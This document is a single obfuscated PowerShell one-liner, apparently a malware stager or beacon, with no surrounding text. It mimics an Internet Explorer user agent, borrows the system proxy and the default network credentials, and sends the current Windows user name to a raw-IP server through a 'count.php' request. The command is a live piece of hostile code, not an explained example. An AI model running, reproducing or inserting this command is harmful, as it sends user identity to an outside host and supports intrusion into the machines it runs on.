
[SYSteM.NET.SErviCePOInTMANaGER]::ExPECT100COntinUE = 0;$wc=New-OBJect SYstem.Net.WeBClIENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEadERS.Add('User-Agent',$u);$Wc.ProXY = [SystEm.Net.WEBReqUeSt]::DeFaulTWEBPROxy;$wC.PRoXy.CrEDEntiALs = [SysTem.NEt.CredENTIalCaChe]::DEFAultNETWOrKCREdEntIALS;$wC.DOwnLOadStRING("http://212.99.114.202:443/count.php?user="+[Environment]::UserName);exit

